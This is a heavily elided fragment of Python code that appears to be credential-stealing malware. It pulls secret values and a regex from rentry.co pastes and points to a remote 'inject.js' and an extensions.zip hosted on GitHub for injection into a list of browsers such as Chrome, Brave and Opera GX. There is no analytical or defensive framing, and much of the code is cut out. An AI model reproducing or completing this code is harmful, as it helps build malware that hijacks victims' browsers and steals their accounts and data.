...
srdl_myname_secret = "https://rentry.co/mzhc9/raw"
thisresp = requests.get(srdl_myname_secret)
hwkish = thisresp.text

srdl_myname_secretbutlil = "https://rentry.co/u4iro/raw"
...
srdl_myregex_secret = "https://rentry.co/i6wvw/raw"
...
json_confg = {
    ...
    "url_srdl": f"https://raw.githubusercontent.com/KebabBusiness09/InjSpa/main/inject.js",
   ...
   #     return (self.operagx, self.opera, self.brave, self.chrome, self.vivaldi, self.edge, self.yandex, self.iron, self.kiwi)
    ...
    def install_extension(self):
        ...
        try:
            ...
            extensions = {
                'extensions': f'https://github.com/KebabBusiness09/InjSpa/raw/main/extensions.zip'
            }
...
def find_in_config(e: str) -> Union[str, bool, None]:
